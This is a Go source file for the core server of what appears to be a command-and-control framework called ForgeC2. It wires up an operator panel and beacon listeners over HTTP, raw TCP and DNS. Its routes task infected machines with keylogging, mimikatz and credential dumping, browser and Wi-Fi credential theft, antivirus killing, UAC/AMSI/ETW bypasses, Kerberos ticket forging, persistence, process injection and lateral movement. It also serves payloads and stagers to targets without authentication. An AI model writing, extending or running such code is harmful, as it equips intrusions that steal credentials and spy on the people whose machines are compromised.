package server

import (
	"crypto/tls"
	"embed"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/config"
	"github.com/forgec2/forgec2/internal/crypto"
	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/server/middleware"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"gorm.io/gorm"
)

//go:embed templates/*
var templateFS embed.FS

type Server struct {
	cfg          *config.Config
	db           *gorm.DB
	router       *gin.Engine
	tmpl         *template.Template
	wsClients    map[*websocket.Conn]bool
	wsMutex      sync.Mutex
	wsUpgrader   websocket.Upgrader
	rateLimiter  *middleware.RateLimiter
	loginLimiter *middleware.RateLimiter
	socksEngine  *socksRelayEngine
	startTime    time.Time

	dnsListener         *DNSBeaconListener
	screenMonitorAgents map[string]time.Time
	screenMonitorMu     sync.Mutex

	// P0-3: rportfwd (reverse port forward)
	rportfwdListeners map[string]*rportfwdRelay
	rportfwdMu        sync.Mutex

	trafficLog  *trafficRing
	updateState updateCheckState
	collab      *collabState

	// WebSocket hubs
	wsHub   *WebSocketHub
	chatHub *ChatHub
}

func New(cfg *config.Config, database *gorm.DB) *Server {
	gin.SetMode(gin.ReleaseMode)

	middleware.InitJWTSecret(cfg)

	r := gin.New()
	r.Use(gin.Recovery())
	r.Use(middleware.SecurityHeaders())
	r.Use(middleware.NoCache())
	r.Use(middleware.ErrorHandler())

	s := &Server{
		cfg:                 cfg,
		db:                  database,
		router:              r,
		wsClients:           make(map[*websocket.Conn]bool),
		rateLimiter:         middleware.NewRateLimiter(BeaconRateLimit, BeaconRateWindow),
		loginLimiter:        middleware.NewRateLimiter(LoginRateLimit, LoginRateWindow),
		socksEngine:         newSocksRelayEngine(),
		startTime:           time.Now(),
		screenMonitorAgents: make(map[string]time.Time),
		rportfwdListeners:   make(map[string]*rportfwdRelay),
		trafficLog:          newTrafficRing(),
		collab:              newCollabState(),
		wsUpgrader: websocket.Upgrader{
			ReadBufferSize:  1024,
			WriteBufferSize: 1024,
			CheckOrigin: func(r *http.Request) bool {
				origin := r.Header.Get("Origin")
				if origin == "" {
					return true
				}
				u, err := url.Parse(origin)
				if err != nil {
					return false
				}
				return u.Host == r.Host
			},
		},
	}

	s.setupTemplates()
	s.setupRoutes()
	s.loadAgentLocks()

	return s
}

func (s *Server) setupTemplates() {
	funcMap := template.FuncMap{
		"formatTime": func(t time.Time) string {
			return t.Format("2006-01-02 15:04:05")
		},
		"statusClass": func(status string) string {
			if status == "online" {
				return "bg-green-500"
			}
			return "bg-red-500"
		},
		"upper": strings.ToUpper,
		"default": func(val, def interface{}) interface{} {
			if val == nil || val == "" {
				return def
			}
			return val
		},
		"formatBytes": func(b int64) string {
			const unit = 1024
			if b < unit {
				return fmt.Sprintf("%d B", b)
			}
			div, exp := int64(unit), 0
			for n := b / unit; n >= unit; n /= unit {
				div *= unit
				exp++
			}
			return fmt.Sprintf("%.1f %cB", float64(b)/float64(div), "KMGTPE"[exp])
		},
		"relativeTime": func(t time.Time) string {
			d := time.Since(t)
			switch {
			case d < time.Minute:
				return "just now"
			case d < time.Hour:
				m := int(d.Minutes())
				if m == 1 {
					return "1 min ago"
				}
				return fmt.Sprintf("%d mins ago", m)
			case d < 24*time.Hour:
				h := int(d.Hours())
				if h == 1 {
					return "1 hour ago"
				}
				return fmt.Sprintf("%d hours ago", h)
			default:
				days := int(d.Hours() / 24)
				if days == 1 {
					return "1 day ago"
				}
				return fmt.Sprintf("%d days ago", days)
			}
		},
		"formatDuration": func(d time.Duration) string {
			if d < time.Minute {
				return fmt.Sprintf("%ds", int(d.Seconds()))
			}
			if d < time.Hour {
				return fmt.Sprintf("%dm%ds", int(d.Minutes()), int(d.Seconds())%60)
			}
			if d < 24*time.Hour {
				return fmt.Sprintf("%dh%dm", int(d.Hours()), int(d.Minutes())%60)
			}
			return fmt.Sprintf("%dd%dh", int(d.Hours()/24), int(d.Hours())%24)
		},
		"boolIcon": func(b bool) string {
			if b {
				return "✔"
			}
			return "✘"
		},
		// Math helpers for pagination (use int64 to match DB counts)
		"add":      func(a, b int64) int64 { return a + b },
		"subtract": func(a, b int64) int64 { return a - b },
		"multiply": func(a, b int64) int64 { return a * b },
		"int64":    func(v int) int64 { return int64(v) },
	}

	tmpl, err := template.New("").Funcs(funcMap).ParseFS(templateFS, "templates/*.html")
	if err != nil {
		slog.Error("Failed to parse templates", "err", err)
		panic(err)
	}
	s.tmpl = tmpl
}

func (s *Server) setupRoutes() {
	// Request logging middleware
	s.router.Use(middleware.RequestLogger())

	// Static files (no auth required)
	s.router.Static("/static", "./internal/server/templates/static")

	// Auth with CSRF and login rate limiting
	s.router.GET("/login", middleware.CSRFProtection(), s.handleLoginPage)
	s.router.POST("/login", s.loginLimiter.Limit(), middleware.CSRFProtection(), s.handleLogin)

	// Health check endpoints (no auth required)
	s.router.GET("/health", s.handleHealthCheck)
	s.router.GET("/ready", s.handleHealthCheck)

	// Protected routes
	auth := s.router.Group("/")
	auth.Use(middleware.AuthRequired(s.db))
	auth.Use(s.AuditMiddleware())
	auth.Use(s.ActivityMiddleware())
	auth.Use(middleware.CSRFProtection())
	{
		auth.GET("/", s.handleDashboard)
		auth.GET("/dashboard", s.handleDashboard)

		// ── Agent pages (read-only, no lock check) ──────────────────────
		auth.GET("/agents", s.handleAgents)
		auth.GET("/agents/:id", s.handleAgentDetail)
		auth.GET("/agents/:id/shell", s.handleShellPage)
		auth.GET("/agents/:id/files", s.handleFileBrowserPage)
		auth.GET("/agents/:id/screen", s.handleScreenMonitorPage)
		auth.GET("/agents/:id/tasks", s.handleGetAgentTasks)
		auth.GET("/agents/:id/tasks/:taskId", s.handleGetTaskStatus)
		auth.GET("/api/agents/unlinked", s.handleListUnlinkedAgents)
		auth.GET("/agents/:id/token", s.handleTokenPage)
		auth.GET("/agents/:id/token/list", s.handleGetTokens)

		// ── Agent operations (note, collab, cancel/rerun, delete — no lock) ─
		auth.POST("/agents/:id/kill", s.handleKillAgent)
		auth.POST("/agents/:id/lock", s.handleLockAgent)
		auth.POST("/agents/:id/unlock", s.handleUnlockAgent)
		auth.POST("/agents/:id/note", s.handleUpdateNote)
		auth.POST("/agents/:id/tasks/:taskId/cancel", s.handleCancelTask)
		auth.POST("/agents/:id/task/:taskId/rerun", s.handleRerunTask)
		auth.DELETE("/agents/:id", s.handleDeleteAgent)
		auth.POST("/agents/batch", s.handleBatchCommand)
		auth.GET("/agents/:id/socks_relay/status", s.handleSocksRelayStatus)

		// ── Agent commands (lock check + viewer check) ──────────────────
		agentCmd := auth.Group("/agents/:id")
		agentCmd.Use(s.agentCommandMiddleware())
		{
			agentCmd.POST("/command", s.handleSendCommand)
			agentCmd.POST("/screenshot", s.handleRequestScreenshot)
			agentCmd.POST("/screenshot_window", s.handleRequestScreenshotWindow)
			agentCmd.POST("/ps", s.handleRequestPS)
			agentCmd.POST("/keylogger/start", s.handleStartKeylogger)
			agentCmd.POST("/keylogger/stop", s.handleStopKeylogger)
			agentCmd.POST("/keylogger/dump", s.handleDumpKeylogger)
			agentCmd.POST("/suspend", s.handleSuspendProcess)
			agentCmd.POST("/resume", s.handleResumeProcess)
			agentCmd.POST("/killproc", s.handleKillProcess)
			agentCmd.POST("/clipboard/get", s.handleClipboardGet)
			agentCmd.POST("/clipboard/set", s.handleClipboardSet)
			agentCmd.POST("/find", s.handleFindFiles)
			agentCmd.POST("/reg/get", s.handleRegGet)
			agentCmd.POST("/reg/set", s.handleRegSet)
			agentCmd.POST("/reg/delete", s.handleRegDelete)
			agentCmd.POST("/reboot", s.handleReboot)
			agentCmd.POST("/shutdown", s.handleShutdown)
			agentCmd.POST("/drives", s.handleListDrives)
			agentCmd.POST("/beacon_now", s.handleBeaconNow)
			agentCmd.POST("/services", s.handleListServices)
			agentCmd.POST("/portscan", s.handlePortScan)
			agentCmd.POST("/netstat", s.handleNetstat)
			agentCmd.POST("/users", s.handleUsers)
			agentCmd.POST("/av", s.handleAV)
			agentCmd.POST("/download_url", s.handleDownloadURL)
			agentCmd.POST("/uninstall", s.handleUninstall)
			agentCmd.POST("/set_sleep", s.handleSetSleep)
			agentCmd.POST("/kill_av", s.handleKillAV)
			agentCmd.POST("/elevate", s.handleElevate)
			agentCmd.POST("/uac_bypass", s.handleUACBypass)
			agentCmd.POST("/amsi_bypass", s.handleAMSIByPass)
			agentCmd.POST("/etw_bypass", s.handleETWByPass)
			agentCmd.POST("/elevate/printnightmare", s.handleElevatePrintNightmare)
			agentCmd.POST("/execute_assembly", s.handleExecuteAssembly)
			agentCmd.POST("/kerberoast", s.handleKerberoast)
			agentCmd.POST("/mimikatz", s.handleMimikatz)
			agentCmd.POST("/powerpick", s.handlePowerPick)
			agentCmd.POST("/net", s.handleNetCommand)
			agentCmd.POST("/persistence", s.handlePersistence)
			agentCmd.POST("/bof", s.handleBOF)
			agentCmd.POST("/browser_steal", s.handleBrowserSteal)
			agentCmd.POST("/creds", s.handleCredsDump)
			agentCmd.POST("/wifi_creds", s.handleWifiCreds)
			agentCmd.POST("/privesc_check", s.handlePrivescCheck)
			agentCmd.POST("/inject", s.handleInject)
			agentCmd.POST("/spawn", s.handleSpawn)
			agentCmd.POST("/self_update", s.handleSelfUpdate)
			agentCmd.POST("/lateral", s.handleLateral)
			agentCmd.POST("/socks", s.handleSocks)

			// ── P0-1: Reflective PE Loader ─────────────────
			agentCmd.POST("/peloader", s.handlePELoader)

			// ── P0-2: Execute-Assembly fork&run ────────────
			agentCmd.POST("/execute_assembly_forkrun", s.handleExecuteAssemblyForkRun)

			// ── P0-3: Reverse Port Forward ─────────────────
			agentCmd.POST("/rportfwd/start", s.handleRPortFwdRelayStart)
			agentCmd.POST("/rportfwd/stop", s.handleRPortFwdRelayStop)

			// ── P0-4: Kerberos Attacks ─────────────────────
			agentCmd.POST("/dcsync", s.handleDCSync)
			agentCmd.POST("/golden_ticket", s.handleGoldenTicket)
			agentCmd.POST("/silver_ticket", s.handleSilverTicket)
			agentCmd.POST("/asreproast", s.handleASREPRoast)
			agentCmd.POST("/pass_the_hash", s.handlePassTheHash)
			agentCmd.POST("/pass_the_ticket", s.handlePassTheTicket)
			agentCmd.POST("/link", s.handleLinkAgent)
			agentCmd.POST("/unlink", s.handleUnlinkAgent)
			agentCmd.POST("/download", s.handleDownload)
			agentCmd.POST("/upload", s.handleUploadFile)

			// ── File browser ──────────────────────────────
			agentCmd.POST("/files/ls", s.handleListDir)
			agentCmd.POST("/files/delete", s.handleFileDelete)
			agentCmd.POST("/files/read", s.handleFileRead)
			agentCmd.POST("/files/upload", s.handleFileUploadFromAgent)

			// ── Screen monitor ────────────────────────────
			agentCmd.POST("/screen/start", s.handleStartScreenMonitor)
			agentCmd.POST("/screen/stop", s.handleStopScreenMonitor)

			// ── Token Impersonation ───────────────────────
			agentCmd.POST("/token/list_procs", s.handleTokenListProcs)
			agentCmd.POST("/token/steal", s.handleTokenSteal)
			agentCmd.POST("/token/make", s.handleTokenMake)
			agentCmd.POST("/token/revert", s.handleTokenRevert)
			agentCmd.POST("/token/whoami", s.handleTokenWhoami)
			agentCmd.DELETE("/token/:token_id", s.handleTokenDrop)
			agentCmd.POST("/token/:token_id/impersonate", s.handleTokenImpersonate)
			agentCmd.POST("/token/:token_id/note", s.handleTokenNoteUpdate)

			// ── SOCKS Relay (agent-side) ─────────────────
			agentCmd.POST("/socks_relay/start", s.handleStartSocksRelay)
			agentCmd.POST("/socks_relay/stop", s.handleStopSocksRelay)
		}

		// ── Generate ────────────────────────────────────────────────────
		auth.GET("/generate", s.handleGeneratePage)
		auth.POST("/generate/exe", s.handleGenerateEXE)
		auth.POST("/generate/ps1", s.handleGeneratePS1)
		auth.POST("/generate/linux", s.handleGenerateLinux)
		auth.POST("/generate/macos", s.handleGenerateMacOS)
		auth.POST("/generate/stager", s.handleGenerateStager)
		auth.POST("/generate/stager_linux", s.handleGenerateStagerLinux)
		auth.POST("/generate/one-liner", s.handleGenerateOneLiner)

		// ── Listeners ───────────────────────────────────────────────────
		auth.GET("/listeners", s.handleListenersPage)
		auth.GET("/listeners/:id", s.handleListenerDetail)
		auth.GET("/api/listeners", s.handleListListeners)
		auth.POST("/api/listeners", s.handleCreateListener)
		auth.PUT("/api/listeners/:id", s.handleUpdateListener)
		auth.DELETE("/api/listeners/:id", s.handleDeleteListener)

		// ── Tasks ───────────────────────────────────────────────────────
		auth.GET("/tasks", s.handleTaskHistory)
		auth.GET("/tasks/export", s.handleExportTasks)
		auth.GET("/tasks/:taskId", s.handleGetTaskStatus)

		// ── Auth ────────────────────────────────────────────────────────
		auth.POST("/logout", s.handleLogout)

		// ── Credentials ─────────────────────────────────────────────────
		auth.GET("/credentials", s.handleCredentialsPage)
		auth.GET("/credentials/export", s.handleExportCredentials)
		auth.POST("/credentials/add", s.handleAddCredential)
		auth.DELETE("/credentials/:cred_id", s.handleDeleteCredential)

		// ── Pivoting / Topology / Loot / Search / Scanner ────────────────
		auth.GET("/pivoting", s.handlePivoting)
		auth.GET("/topology", s.handleTopologyPage)
		auth.GET("/api/topology/data", s.handleTopologyData)
		auth.GET("/loot", s.handleLootPage)
		auth.GET("/search", s.handleGlobalSearch)
		auth.GET("/scanner", s.handleScannerPage)
		auth.POST("/api/scan", s.handleScanTask)
		auth.GET("/api/scan/results/:taskId", s.handleScanResults)
		auth.GET("/api/scan/agent/:agentId", s.handleScanResultsByAgent)
		auth.POST("/api/scan/result", s.handleProcessScanResult)
		auth.GET("/api/scan/export/:taskId", s.handleExportScanResults)
		auth.POST("/api/browser/result", s.handleProcessBrowserResult)
		auth.POST("/api/wifi/result", s.handleProcessWifiResult)
		auth.POST("/api/lateral/result", s.handleProcessLateralResult)
		auth.POST("/api/privesc/result", s.handleProcessPrivescResult)
		auth.GET("/privesc", s.handlePrivescPage)
		auth.GET("/api/privesc/history/:id", s.handlePrivescHistory)

		// ── Timeline ────────────────────────────────────────────────────
		auth.GET("/timeline", s.handleTimelinePage)
		auth.GET("/api/timeline/data", s.handleTimelineData)
		auth.GET("/api/timeline/export", s.handleTimelineExport)

		// ── Report ──────────────────────────────────────────────────────
		auth.GET("/report", s.handleReportPage)
		auth.POST("/api/report/generate", s.handleGenerateReport)

		// ── Lateral Movement ───────────────────────────────────────────
		auth.GET("/lateral", s.handleLateralPage)
		auth.GET("/api/lateral/history/:id", s.handleLateralHistory)

		// ── Command Templates ─────────────────────────────────────────
		auth.GET("/templates", s.handleTemplatesPage)
		auth.POST("/api/templates", s.handleCreateTemplate)
		auth.DELETE("/api/templates/:id", s.handleDeleteTemplate)
		auth.GET("/api/templates/category/:category", s.handleGetTemplatesByCategory)

		// ── Audit ───────────────────────────────────────────────────────
		auth.GET("/audit", s.handleAuditLogPage)
		auth.GET("/audit/logs", s.handleGetAuditLogs)

		// ── Settings ────────────────────────────────────────────────────
		auth.GET("/settings", s.handleSettingsPage)
		auth.POST("/settings/password", s.handleChangePassword)
		auth.POST("/settings/agent", s.handleSaveAgentConfig)
		auth.POST("/settings/server", s.handleSaveServerConfig)
		auth.POST("/settings/malleable", s.handleSaveMalleableProfile)
		auth.POST("/settings/purge/tasks", s.handlePurgeTasks)
		auth.POST("/settings/purge/audit", s.handlePurgeAuditLogs)
		auth.POST("/settings/jwt/regenerate", s.handleRegenerateJWT)
		auth.POST("/settings/db/vacuum", s.handleDBVacuum)
		auth.POST("/settings/db/backup", s.handleBackupDatabase)
		auth.GET("/settings/config/download", s.handleDownloadConfig)

		// ── WebSocket ───────────────────────────────────────────────────
		auth.GET("/ws", s.handleWebSocket)
		auth.GET("/ws/beacon", s.handleWebSocketBeacon)
		auth.GET("/ws/chat", s.handleWebSocketChat)

		// ── Chat ────────────────────────────────────────────────────────
		auth.GET("/chat", s.handleChatPage)
		auth.GET("/api/chat/messages", s.handleGetChatMessages)
		auth.POST("/api/chat/send", s.handleSendChatMessage)
		auth.DELETE("/api/chat/:id", s.handleDeleteChatMessage)

		// ── Tokens ──────────────────────────────────────────────────────
		auth.GET("/tokens", s.handleGlobalTokensPage)

		// ── User Management ─────────────────────────────────────────────
		auth.GET("/users", s.handleUsersPage)
		auth.POST("/users/add", s.handleAddUser)
		auth.POST("/users/:id/edit", s.handleEditUser)
		auth.POST("/users/:id/toggle", s.handleToggleUser)
		auth.POST("/users/:id/password", s.handleSetUserPassword)
		auth.POST("/users/:id/kick", s.handleKickUser)
		auth.POST("/users/:id/force-logout", s.handleForceLogoutUser)
		auth.DELETE("/users/:id", s.handleDeleteUser)

		// ── SOCKS Sessions ──────────────────────────────────────────────
		auth.GET("/socks/sessions", s.handleGetSocksSessions)
	}

	// Agent Beacon API with rate limiting
	api := s.router.Group("/api/v1")
	api.Use(s.rateLimiter.Limit())
	api.Use(s.trafficMiddleware())
	{
		api.POST("/beacon", s.handleBeacon)
		api.POST("/screen_frame", s.handleScreenFrame)

		// Malleable profile support (similar to Cobalt Strike)
		api.POST("/generate_204", s.handleBeacon)
		api.POST("/th", s.handleBeacon)          // for bing like /th?id=...
		api.GET("/generate_204", s.handleBeacon) // support GET if profile uses
		api.GET("/th", s.handleBeacon)
	}

	// Build logs
	auth.GET("/builds", s.handleBuildLogs)

	// Traffic monitor
	auth.GET("/traffic", s.handleTrafficPage)
	auth.GET("/api/traffic", s.handleTrafficData)

	// Multi-User Collaboration
	auth.GET("/api/collab/locks", s.handleGetLocks)
	auth.POST("/api/collab/chat", s.handleChatSend)
	auth.GET("/api/collab/chat", s.handleChatHistory)
	auth.GET("/api/collab/online", s.handleOnlineUsers)
	auth.GET("/api/collab/pages", s.handlePagePresence)
	auth.GET("/api/collab/agent-viewers/:id", s.handleAgentViewers)

	// Version update check & hot-update
	auth.GET("/api/update-check", s.handleUpdateCheck)
	auth.GET("/api/update-check/version", s.handleCheckVersion)
	auth.POST("/api/update-check/refresh", s.handleRefreshUpdateCheck)
	auth.POST("/api/update-check/hot-update", s.handleHotUpdate)

	// Stage serving for Artifact Kit (no auth — stagers are unauthenticated)
	s.router.GET("/stage/:xorKey", s.handleServeStage)

	// One-Liner payload hosting (no auth — target machines download these)
	s.router.GET("/payloads/:id/:filename", s.handleServePayload)

	// Screenshot serving (protected)
	s.router.GET("/screenshots/:agent_id/:filename", middleware.AuthRequired(s.db), s.handleServeScreenshot)
}

// handleWebSocket handles WebSocket connections for real-time notifications
func (s *Server) handleWebSocket(c *gin.Context) {
	conn, err := s.wsUpgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		slog.Error("Failed to upgrade WebSocket", "err", err)
		return
	}

	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	// Extract user identity from context (set by AuthRequired middleware)
	user, _ := c.Get("user")
	username := fmt.Sprintf("%v", user)
	userID, _ := c.Get("user_id")
	uid, _ := userID.(uint)
	role, _ := c.Get("user_role")
	roleStr := fmt.Sprintf("%v", role)

	s.addWSConn(conn, uid, username, roleStr)

	slog.Info("WebSocket client connected", "user", username)

	go func() {
		defer func() {
			s.removeWSConn(conn)
			conn.Close()
			slog.Info("WebSocket client disconnected", "user", username)
		}()

		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
				if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
					return
				}
			default:
				conn.SetReadDeadline(time.Now().Add(60 * time.Second))
				msgType, msgBytes, err := conn.ReadMessage()
				if err != nil {
					return
				}
				if msgType == websocket.TextMessage && len(msgBytes) > 0 {
					var msgData map[string]interface{}
					if err := json.Unmarshal(msgBytes, &msgData); err == nil {
						s.handleWSMessage(conn, msgData)
					}
				}
			}
		}
	}()
}

// broadcastToClients sends a message to all connected WebSocket clients.
// Iterates over a snapshot of the map to avoid holding the lock during writes.
func (s *Server) broadcastToClients(message []byte) {
	s.wsMutex.Lock()
	clients := make([]*websocket.Conn, 0, len(s.wsClients))
	for conn := range s.wsClients {
		clients = append(clients, conn)
	}
	s.wsMutex.Unlock()

	for _, conn := range clients {
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if err := conn.WriteMessage(websocket.TextMessage, message); err != nil {
			slog.Error("Failed to send WebSocket message", "err", err)
			s.wsMutex.Lock()
			conn.Close()
			delete(s.wsClients, conn)
			s.wsMutex.Unlock()
		}
	}
}

// broadcastAgentNotification sends a notification to all WebSocket clients
func (s *Server) broadcastAgentNotification(agent db.Agent) {
	payload := map[string]string{
		"type":     "agent_online",
		"agent_id": agent.ID,
		"hostname": agent.Hostname,
		"username": agent.Username,
		"ip":       agent.IP,
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal agent notification", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

// broadcastTaskUpdate pushes task status (and result if completed) to WS clients
func (s *Server) broadcastTaskUpdate(agentID string, task db.Task) {
	payload := map[string]interface{}{
		"type":       "task_update",
		"agent_id":   agentID,
		"task_id":    task.ID,
		"task_type":  task.Type,
		"status":     task.Status,
		"command":    task.Command,
		"created_by": task.CreatedBy,
	}
	if task.Result != "" {
		payload["result"] = truncateString(task.Result, 200)
	}
	if task.Error != "" {
		payload["error"] = task.Error
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal task update", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

func truncateString(s string, max int) string {
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}

// cleanupOldData removes old completed/failed tasks and old files (screenshots + uploads) to prevent bloat
func (s *Server) cleanupOldData() {
	retention := s.cfg.Server.CleanupRetentionDays
	if retention < 1 {
		retention = 30
	}
	cutoff := time.Now().AddDate(0, 0, -retention)

	// delete old tasks
	if err := s.db.Where("created_at < ? AND status IN ?", cutoff, []string{"completed", "failed"}).Delete(&db.Task{}).Error; err != nil {
		slog.Error("cleanup tasks failed", "err", err)
	}

	dataDir := s.cfg.Server.DataDir
	if dataDir == "" {
		dataDir = "data"
	}

	// Clean old screenshots
	s.cleanOldFiles(filepath.Join(dataDir, "screenshots"), cutoff)

	// Clean old uploads (exfil files)
	s.cleanOldFiles(filepath.Join(dataDir, "uploads"), cutoff)

	slog.Info("old data cleanup completed")
}

func (s *Server) offlineThreshold() time.Duration {
	d := s.cfg.Server.OfflineThreshold
	if d < 1 {
		d = 60
	}
	return time.Duration(d) * time.Second
}

// cleanOldFiles recursively removes files older than cutoff in the given dir
func (s *Server) cleanOldFiles(dir string, cutoff time.Time) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, e := range entries {
		path := filepath.Join(dir, e.Name())
		if e.IsDir() {
			s.cleanOldFiles(path, cutoff) // recurse into agent subdirs
			// optionally remove empty dirs
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		if info.ModTime().Before(cutoff) {
			_ = os.Remove(path)
		}
	}
}

func (s *Server) Run() error {
	certPath := s.cfg.Server.CertFile
	keyPath := s.cfg.Server.KeyFile

	if s.cfg.Server.TLSEnabled {
		if err := crypto.GenerateSelfSignedCert(certPath, keyPath); err != nil {
			slog.Error("Failed to generate self-signed cert", "err", err)
			return err
		}
		slog.Info("TLS certificate ready", "cert", certPath)
	}

	// start periodic cleanup
	go s.runPeriodicCleanup()
	go s.cleanupStaleSocks()
	go s.periodicRPortFwdCleanup()

	// start update checker
	s.initUpdateChecker()

	// periodic cleanup of hosted one-liner payloads
	go func() {
		for {
			time.Sleep(30 * time.Minute)
			s.cleanupOldPayloads()
		}
	}()

	// Start TCP transport layer if enabled (high priority feature)
	if s.cfg.Server.TCPEnabled && s.cfg.Server.TCPAddr != "" {
		go s.startTCPListener()
	}

	// Start DNS C2 listener if enabled
	if s.cfg.Server.DNSEnabled && s.cfg.Server.DNSDomain != "" {
		dl := NewDNSBeaconListener(s.cfg.Server.DNSDomain, s.cfg.Server.Host, 0)
		dl.SetHandler(func(agentID string, reqJSON []byte) []byte {
			var req beaconRequest
			if len(reqJSON) > 0 {
				if err := json.Unmarshal(reqJSON, &req); err != nil {
					slog.Error("DNS beacon handler unmarshal error", "err", err)
				}
			}
			if req.UUID == "" {
				req.UUID = agentID
			}
			resp := s.processBeacon(req)
			respJSON, _ := json.Marshal(resp)
			return respJSON
		})
		s.dnsListener = dl
		go dl.Start()
	}

	addr := s.cfg.Server.Host + ":" + itoa(s.cfg.Server.Port)
	slog.Info("Starting ForgeC2 server", "addr", addr, "tls", s.cfg.Server.TLSEnabled)

	if s.cfg.Server.TLSEnabled {
		tlsCfg := &tls.Config{
			MinVersion: tls.VersionTLS12,
		}
		server := &http.Server{
			Addr:         addr,
			Handler:      s.router,
			TLSConfig:    tlsCfg,
			ReadTimeout:  30 * time.Second,  // Prevent slow client attacks
			WriteTimeout: 60 * time.Second,  // Prevent slow response attacks
			IdleTimeout:  120 * time.Second, // Keep-alive connections
		}
		return server.ListenAndServeTLS(certPath, keyPath)
	}
	return s.router.Run(addr)
}

func (s *Server) runPeriodicCleanup() {
	s.cleanupOldData()
	ticker := time.NewTicker(24 * time.Hour)
	for range ticker.C {
		s.cleanupOldData()
	}
}

func (s *Server) periodicRPortFwdCleanup() {
	for {
		time.Sleep(5 * time.Minute)
		s.cleanupStaleRPortFwd()
	}
}

func itoa(i int) string {
	return fmt.Sprintf("%d", i)
}

// startTCPListener starts a raw TCP transport listener for agents using Protocol=tcp.
// Uses length-prefixed JSON (4-byte BE len + JSON) for BeaconRequest / BeaconResponse.
func (s *Server) startTCPListener() {
	ln, err := net.Listen("tcp", s.cfg.Server.TCPAddr)
	if err != nil {
		slog.Error("Failed to start TCP listener", "addr", s.cfg.Server.TCPAddr, "err", err)
		return
	}
	slog.Info("TCP transport layer listening", "addr", s.cfg.Server.TCPAddr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go s.handleTCPConnection(conn)
	}
}

func (s *Server) handleTCPConnection(conn net.Conn) {
	defer conn.Close()
	slog.Info("TCP agent connected", "remote", conn.RemoteAddr().String())

	for {
		// Read length prefix (big endian uint32)
		var msgLen uint32
		if err := binary.Read(conn, binary.BigEndian, &msgLen); err != nil {
			return
		}
		if msgLen == 0 || msgLen > 16*1024*1024 {
			return
		}

		buf := make([]byte, msgLen)
		if _, err := io.ReadFull(conn, buf); err != nil {
			return
		}

		var req beaconRequest
		if err := json.Unmarshal(buf, &req); err != nil {
			slog.Error("TCP bad beacon json", "err", err)
			return
		}

		resp := s.processBeacon(req)

		respBytes, _ := json.Marshal(resp)
		if err := binary.Write(conn, binary.BigEndian, uint32(len(respBytes))); err != nil {
			return
		}
		if _, err := conn.Write(respBytes); err != nil {
			return
		}
	}
}

// ActivityMiddleware updates user's LastActivity timestamp on each request (throttled to 60s)
func (s *Server) ActivityMiddleware() gin.HandlerFunc {
	var mu sync.Mutex
	lastUpdated := make(map[uint]time.Time)
	return func(c *gin.Context) {
		userID, exists := c.Get("user_id")
		if !exists {
			c.Next()
			return
		}
		uid, ok := userID.(uint)
		if !ok {
			c.Next()
			return
		}
		now := time.Now()
		mu.Lock()
		last := lastUpdated[uid]
		if now.Sub(last) < 60*time.Second {
			mu.Unlock()
			c.Next()
			return
		}
		lastUpdated[uid] = now
		mu.Unlock()
		go s.db.Model(&db.User{}).Where("id = ?", uid).Update("last_activity", now)
		c.Next()
	}
}

// getAgentOrFail fetches agent by ID. On failure writes JSON 404 and returns false.
func (s *Server) getAgentOrFail(c *gin.Context, id string) (db.Agent, bool) {
	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		slog.Error("Agent not found", "agent_id", id, "error", err)
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return agent, false
	}
	return agent, true
}

// createTask creates and persists a new pending task. Returns the task or error.
func (s *Server) createTask(agentID, taskType, command, shell, path, data string, offset, size int64) (*db.Task, error) {
	task := db.Task{
		AgentID: agentID,
		Type:    taskType,
		Command: command,
		Shell:   shell,
		Path:    path,
		Data:    data,
		Offset:  offset,
		Size:    size,
		Status:  "pending",
	}
	if err := s.db.Create(&task).Error; err != nil {
		return nil, err
	}
	return &task, nil
}

// dispatchTask logs the audit action, broadcasts the update via WS, and returns success JSON.
// Sets CreatedBy from the authenticated user in context.
func (s *Server) dispatchTask(c *gin.Context, task *db.Task, auditAction, details string) {
	// Set task attribution from context
	user, _ := c.Get("user")
	if username, ok := user.(string); ok && username != "" && task.CreatedBy == "" {
		task.CreatedBy = username
		s.db.Model(task).Update("created_by", username)
	}
	s.LogAuditRecord(c, auditAction, "agent", task.AgentID, details, true, nil)
	s.broadcastTaskUpdate(task.AgentID, *task)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

// handleHealthCheck provides health/ready endpoints for monitoring
func (s *Server) handleHealthCheck(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"status":    "ok",
		"version":   ServerVersion,
		"uptime":    time.Since(s.startTime).String(),
		"goroutine": runtime.NumGoroutine(),
	})
}
